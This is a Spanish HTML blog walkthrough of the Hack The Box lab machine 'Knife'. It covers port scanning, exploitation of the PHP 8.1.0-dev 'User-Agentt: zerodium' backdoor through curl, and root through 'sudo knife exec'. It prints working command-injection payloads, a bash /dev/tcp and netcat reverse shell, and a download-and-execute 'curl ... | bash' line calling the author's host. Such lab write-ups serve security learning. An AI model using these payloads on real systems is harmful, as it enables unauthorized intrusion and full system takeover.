&lt;h2 id=&quot;enum-nmap&quot;&gt;Escaneo de puertos con &lt;u&gt;nmap&lt;/u&gt; &lt;a href=&quot;#enum-nmap&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Empezaremos haciendo un escaneo de puertos, esto nos permitir√° conocer que servicios esta corriendo el sistema, usaremos &lt;strong&gt;nmap&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nmap -p- --open -v 10.10.10.242 -oG initScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todos los 65535&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;‚Äìopen&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que est√°n abiertos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oG&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para usar una &lt;a href=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png&quot;&gt;funci√≥n &lt;strong&gt;extractPorts&lt;/strong&gt;&lt;/a&gt; de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; que me extrae los puertos en la clipboard&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Obtenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat initScan
# Nmap 7.80 scan initiated Sun Jun 20 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.242
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.242 ()	Status: Up
Host: 10.10.10.242 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Sun Jun 20 25:25:25 2021 -- 1 IP address (1 host up) scanned in 77.55 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://www.hackingarticles.in/ssh-penetration-testing-port-22/&quot;&gt;SSH&lt;/a&gt;&lt;/strong&gt;: Obtenci√≥n de una Shell de manera segura&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://searchnetworking.techtarget.com/definition/port-80&quot;&gt;HTTP&lt;/a&gt;&lt;/strong&gt;: Servidor web&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Ahora que tenemos los puertos, hagamos un escaneo m√°s reducido, en √©l buscaremos que versiones y scripts est√°n relacionados con cada servicio:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;~(Usando la funci√≥n &lt;code&gt;extractPorts&lt;/code&gt; (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, que en este caso dar√≠a igual, ya que son 2 puertos no m√°s, pero esto es muy funcional cuando tenemos varios puertos, as√≠ no tendr√≠amos que ir uno a uno&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.242
    [*] Open ports: 22,80

[*] Ports copied to clipboard
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;)~&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nmap -p 22,80 -sC -sV 10.10.10.242 -oN portScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo de los puertos obtenidos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Muestra todos los scripts relacionados con el servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nos permite ver la versi√≥n del servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oN&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Tendriamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat portScan
# Nmap 7.80 scan initiated Sun Jun 20 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.242
Nmap scan report for 10.10.10.242
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jun 20 25:25:25 2021 -- 1 IP address (1 host up) scanned in 11.71 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Cositas relevantes:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Versi√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SSH&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OpenSSH 8.2p1 Ubuntu 4ubuntu0.2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apache/2.4.41&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Pero por ahora poco m√°s, as√≠ que empecemos a explorar cada puerto y veamos por donde pinchar.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;enumeracion&quot;&gt;Enumeraci√≥n &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;puerto-80&quot;&gt;Puerto 80 &lt;a href=&quot;#puerto-80&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347page80.png&quot; alt=&quot;347page80&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Encontramos una interfaz bastante simple, sin posibilidad de interactuar con ella ni movernos por ah√≠‚Ä¶&lt;/p&gt;

&lt;p&gt;Buscando vulnerabilidades relacionadas con &lt;code&gt;Apache 2.4.41&lt;/code&gt; no encontramos nada √∫til.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;explotacion&quot;&gt;Explotaci√≥n &lt;a href=&quot;#explotacion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Jugando con &lt;strong&gt;Wappalyzer&lt;/strong&gt; (extensi√≥n web) vemos que el servidor web cuenta con el servicio &lt;strong&gt;PHP&lt;/strong&gt; en su versi√≥n &lt;code&gt;8.1.0&lt;/code&gt;, buscando en internet vulnerabilidades sobre ella, encontramos una interesante:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html&quot;&gt;&lt;strong&gt;PHP 8.1.0-dev&lt;/strong&gt; Backdoor Remote Command Injection&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/49933&quot;&gt;&lt;strong&gt;PHP 8.1.0-dev&lt;/strong&gt; - ‚ÄòUser-Agentt‚Äô Remote Code Execution&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Us√°ndola podremos conseguir ejecuci√≥n remota de comandos aprovech√°ndonos de la funci√≥n &lt;a href=&quot;https://flylib.com/books/en/2.565.1/calling_back_into_php.html&quot;&gt;zend_eval_string()&lt;/a&gt; (que puede ejecutar peque√±os fragmentos de c√≥digo en el sistema) de &lt;strong&gt;PHP&lt;/strong&gt;, el c√≥digo vulnerable es este:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;...
  convert_to_string(enc);
  if (strstr(Z_STRVAL_P(enc), &quot;zerodium&quot;)) {
    zend_try {
      zend_eval_string(Z_STRVAL_P(enc)+8, NULL, &quot;REMOVETHIS: sold to zerodium, mid 2017&quot;);
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Donde pr√°cticamente lo que hace es:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Pasa (seg√∫n el nombre de la funci√≥n) lo que llegue (&lt;code&gt;enc&lt;/code&gt;) a cadena de texto.&lt;/li&gt;
  &lt;li&gt;Si ese contenido (&lt;code&gt;enc&lt;/code&gt;) a la primera encuentra (&lt;a href=&quot;https://www.php.net/manual/es/function.strstr.php&quot;&gt;strstr&lt;/a&gt;) la cadena ‚Äú&lt;strong&gt;zerodium&lt;/strong&gt;‚Äù en &lt;code&gt;enc&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Entra a ejecutar (&lt;a href=&quot;https://flylib.com/books/en/2.565.1/calling_back_into_php.html&quot;&gt;zend_eval_string&lt;/a&gt;) el contenido de &lt;code&gt;enc&lt;/code&gt;.
    &lt;ul&gt;
      &lt;li&gt;As√≠ que simplemente deber√≠amos aprovechar que entre en esta funci√≥n e indicarle que nos ejecute algo (con ayuda de &lt;code&gt;system()&lt;/code&gt; o &lt;code&gt;exec()&lt;/code&gt; o &lt;code&gt;shell_exec&lt;/code&gt; o lo que sea :P)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Esto tiene que hacerse con el header &lt;code&gt;User-Agentt&lt;/code&gt;, donde su contenido sea el que contenga &lt;strong&gt;zerodium‚Ä¶&lt;/strong&gt;, siguiendo los &lt;strong&gt;pocs&lt;/strong&gt; vemos que su explotaci√≥n es muy sencilla, podemos jugar con &lt;code&gt;curL&lt;/code&gt; y probar:&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;expl-revsh-james&quot;&gt;Jugamos con la vulnerabilidad de &lt;u&gt;PHP 8.1.0&lt;/u&gt; &lt;a href=&quot;#expl-revsh-james&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Por ejemplo, si queremos ejecutar el comando &lt;code&gt;whoami&lt;/code&gt;, har√≠amos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system(&quot;whoami&quot;);' | head -n 1
james
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;O para ver el &lt;code&gt;id&lt;/code&gt; de (en este caso) &lt;strong&gt;james&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system(&quot;id&quot;);' | head -n 1
uid=1000(james) gid=1000(james) groups=1000(james)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As√≠ que ya tenemos constancia que estamos ejecutando comandos en el sistema, pero ¬øsobre cu√°l?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system(&quot;hostname&quot;);' | head -n 1
knife
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bien, al parecer estamos sobre el sistema base y no sobre alg√∫n contenedor, pues aprovechemos esto para obtener una Reverse Shell en el sistema‚Ä¶&lt;/p&gt;

&lt;p&gt;Podr√≠amos colocar el comando dentro de la funci√≥n &lt;code&gt;system()&lt;/code&gt;, pero para trabajar un poco m√°s organizados y no estar cambiando muchas cosas, vamos a crear un archivo &lt;code&gt;.sh&lt;/code&gt; el cual contendr√° nuestro c√≥digo a ejecutar en el sistema yyy lo √∫nico que haremos sera decirle al sistema que venga a buscarlo (:&lt;/p&gt;

&lt;p&gt;Pero primero validemos si existe &lt;code&gt;curL&lt;/code&gt; en la m√°quina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system(&quot;which curl&quot;);' | head -n 1
/usr/bin/curl
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Bien, entonces ahora si creemos el archivo &lt;code&gt;.sh&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat rev.sh 
#!/bin/bash

id | nc 10.10.14.103 4433
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Inicialmente le diremos que nos env√≠e al puerto &lt;strong&gt;4433&lt;/strong&gt; de nuestra m√°quina el resultado del comando &lt;strong&gt;id&lt;/strong&gt;. (Esto nos sirve para comprobar si existe &lt;code&gt;nc&lt;/code&gt;, si nos lee el archivo &lt;code&gt;.sh&lt;/code&gt; y reafirmamos el &lt;strong&gt;RCE&lt;/strong&gt;)&lt;/p&gt;

&lt;p&gt;Pong√°monos en escucha por el puerto &lt;strong&gt;4433&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nc -lvp 4433
listening on [any] 4433 ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y levantemos nuestro servidor web, as√≠ jugando con &lt;code&gt;curL&lt;/code&gt; lograremos que la m√°quina encuentre nuestro archivo &lt;code&gt;.sh&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora s√≠, ejecutamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system(&quot;/usr/bin/curl http://10.10.14.103:8000/rev.sh&quot;);' | head
#!/bin/bash

id | nc 10.10.14.103 4433
&amp;lt;!DOCTYPE html&amp;gt;
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo lee, solo nos queda indicarle que en vez de leer el script lo interprete, o sea, lo ejecute:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system(&quot;/usr/bin/curl http://10.10.14.103:8000/rev.sh | bash&quot;);' | head
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y en nuestro listener obtenemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347bash_phpvuln_idNC.png&quot; alt=&quot;347bash_phpvuln_idNC&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Perfessssssto, pues ahora si hagamos la &lt;strong&gt;Reverse Shell&lt;/strong&gt;, lo √∫nico que debemos cambiar es nuestro archivo &lt;code&gt;.sh&lt;/code&gt; y volvernos a poner en escucha:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat rev.sh 
#!/bin/bash

nc 10.10.14.103 4433 -e /bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Con esto le indicamos que apenas establezca la conexi√≥n con el puerto &lt;strong&gt;4433&lt;/strong&gt; de nuestra m√°quina nos lance una &lt;code&gt;/bin/bash&lt;/code&gt; (una &lt;strong&gt;Shell&lt;/strong&gt;)‚Ä¶&lt;/p&gt;

&lt;p&gt;Pero ejecutando de nuevo no conseguimos nada.&lt;/p&gt;

&lt;p&gt;Lo m√°s probable es que la versi√≥n de &lt;strong&gt;nc&lt;/strong&gt; que tenga el sistema sea la que &lt;strong&gt;no soporta&lt;/strong&gt; el uso del par√°metro &lt;code&gt;-e&lt;/code&gt;, as√≠ que modifiquemos el archivo &lt;code&gt;.sh&lt;/code&gt; con otra opci√≥n:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat rev.sh 
#!/bin/bash

bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.103/4433 0&amp;gt;&amp;amp;1'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pr√°cticamente le indicamos lo mismo, ‚Äúapenas obtengas la conexi√≥n con el puerto l√°nzame una &lt;code&gt;bash&lt;/code&gt;‚Äù, ejecutamos nuestro &lt;code&gt;curL&lt;/code&gt; yyyyy:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± curl -s http://10.10.10.242/ -H 'User-Agentt: zerodium;system(&quot;/usr/bin/curl http://10.10.14.103:8000/rev.sh | bash&quot;);'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347bash_phpvuln_jamesRevSH.png&quot; alt=&quot;347bash_phpvuln_jamesRevSH&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bien, ahora tenemos una &lt;strong&gt;Shell&lt;/strong&gt; como &lt;strong&gt;james&lt;/strong&gt; en la m√°quina (:&lt;/p&gt;

&lt;h2 id=&quot;tratamiento-de-la-tty&quot;&gt;Tratamiento de la TTY&lt;/h2&gt;

&lt;p&gt;Antes de seguir hagamos nuestra terminal un poco m√°s amigable, permiti√©ndonos as√≠ ejecutar &lt;code&gt;CTRL+C&lt;/code&gt;, tener hist√≥rico de comandos y movernos entre ellos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;james@knife:/$ script /dev/null -c bash
#Ejecutamos CTRL+Z
james@knife:/$ ^Z 
[1]+  Detenido                nc -lvp 4433
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despu√©s escribimos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± stty raw -echo; fg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y aunque se vea corrido escribimos &lt;code&gt;reset&lt;/code&gt; y despu√©s &lt;code&gt;xterm&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;            reset
reset: unknown terminal type unknown
Terminal type? xterm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y por ultimo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;james@knife:/$ export TERM=xterm
james@knife:/$ export SHELL=bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos apoyamos de otra ventana para obtener el tama√±o de las filas y columnas, ejecutamos &lt;code&gt;stty -a&lt;/code&gt;, tomamos esos valores y escribimos ahora en la m√°quina:&lt;/p&gt;

&lt;p&gt;(Estos son los m√≠os)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;james@knife:/$ stty rows 43 columns 192
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y listo, podemos movernos libremente por la consola sin temor a perderla en alg√∫n &lt;code&gt;CTRL+C&lt;/code&gt; y adem√°s tenemos hist√≥rico :)&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Viendo que permisos tenemos sobre otros usuarios (&lt;a href=&quot;https://es.wikipedia.org/wiki/Sudo&quot;&gt;sudo&lt;/a&gt; encontramos que podemos ejecutar un binario como &lt;strong&gt;root&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Validando el binario, vemos varias cositas:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;james@knife:~$ ls -la /usr/bin/knife
lrwxrwxrwx 1 root root 31 May  7 11:03 /usr/bin/knife -&amp;gt; /opt/chef-workstation/bin/knife
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Es un &lt;strong&gt;link simb√≥lico&lt;/strong&gt; al binario &lt;code&gt;/opt/chef-workstation/bin/knife&lt;/code&gt;, bien, r√°pidamente:&lt;/p&gt;

&lt;p&gt;üë©‚Äçüç≥ &lt;strong&gt;&lt;em&gt;&lt;code&gt;Chef&lt;/code&gt; &lt;a href=&quot;https://www.linkeit.com/es/blog/glosario-terminos-chef-server&quot;&gt;es un sistema de automatizaci√≥n&lt;/a&gt; que facilita el despliegue de servidores y aplicaciones.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;üî™ &lt;strong&gt;&lt;em&gt;Y &lt;a href=&quot;https://docs.chef.io/workstation/knife/&quot;&gt;Knife&lt;/a&gt; es una herramienta de terminal que interact√∫a con un &lt;u&gt;servidor Chef&lt;/u&gt;‚Ä¶&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Buscando cositas sobre ella y como aprovecharnos de su uso para escalar privilegios, encontramos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347google_knifelinuxexploit.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Knife&lt;/strong&gt; tiene un &lt;em&gt;subcomando&lt;/em&gt; llamado &lt;code&gt;exec&lt;/code&gt;, el cual permite la ejecuci√≥n de scripts &lt;strong&gt;Ruby&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Ech√°ndole un ojo a la &lt;a href=&quot;https://docs.chef.io/workstation/knife_exec/&quot;&gt;wiki de &lt;strong&gt;knife_exec&lt;/strong&gt;&lt;/a&gt; encontramos su uso:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347google_wiki_knifelinuxexploit_opts.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347google_wiki_knifelinuxexploit_examples.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tenemos la opci√≥n &lt;code&gt;-E&lt;/code&gt; que ejecuta c√≥digo directamente, pues intentemos jugar con ella‚Ä¶&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.rubyguides.com/2018/12/ruby-system/&quot;&gt;How to run &lt;strong&gt;System Commands&lt;/strong&gt; from Ruby&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Es muy simple, si queremos ejecutar el comando &lt;code&gt;id&lt;/code&gt;, lo har√≠amos as√≠:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-ruby&quot;&gt;system(&quot;id&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;¬øSencillito, no? Pues hag√°moslo pero con &lt;strong&gt;knife exec&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;james@knife:/$ /usr/bin/knife exec -E 'system(&quot;id&quot;)'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos para saber el &lt;strong&gt;id&lt;/strong&gt; del usuario que esta ejecutando el proceso y obtenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;james@knife:/$ /usr/bin/knife exec -E 'system(&quot;id&quot;)'
WARNING: No knife configuration file found. See https://docs.chef.io/config_rb/ for details.
uid=1000(james) gid=1000(james) groups=1000(james)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y si, nos ejecuta comandos en este caso como &lt;strong&gt;james&lt;/strong&gt;, ya que no le hemos indicado que ejecute &lt;code&gt;/usr/bin/knife&lt;/code&gt; con otros permisos o como otro usuario :P (sin &lt;a href=&quot;https://es.wikipedia.org/wiki/Sudo&quot;&gt;sudo&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Ahora hag√°moslo con los permisos del usuario &lt;strong&gt;root&lt;/strong&gt; a ver si funciona (&lt;strong&gt;sudo&lt;/strong&gt; solito le indica al sistema que queremos jugar con el usuario &lt;strong&gt;root&lt;/strong&gt;, o tambi√©n podr√≠amos indic√°rselo usando &lt;code&gt;-u root&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;james@knife:/$ sudo /usr/bin/knife exec -E 'system(&quot;id&quot;)'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347bash_knifeexec_idroot.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Opa la popa, estamos ejecutando comandos en el sistema como el usuario &lt;strong&gt;root&lt;/strong&gt; üòÉ Pues ejecut√©monos una &lt;code&gt;/bin/bash&lt;/code&gt; ah√≠ de rapidez:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;james@knife:/$ sudo /usr/bin/knife exec -E 'system(&quot;/bin/bash&quot;)'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347bash_knifeexec_bash.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listoneeeeeeeeeeeeeeeeeeees! Estamos dentro del sistema como el usuario &lt;strong&gt;root&lt;/strong&gt; (:&lt;/p&gt;

&lt;p&gt;Vistaziemos las flags :o&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/knife/347flags.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ey, emho telminao‚Äô&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Linda m√°quina, me gusto que es real-life, un &lt;strong&gt;CVE&lt;/strong&gt; y una aplicaci√≥n que por default tiene la opci√≥n de ejecutar comandos.&lt;/p&gt;

&lt;p&gt;Lo raro es que esta rateada super bajo y no me parecio que estuviera mal, como m√°quina para empezar esta muuuuuuuuuy bien.&lt;/p&gt;

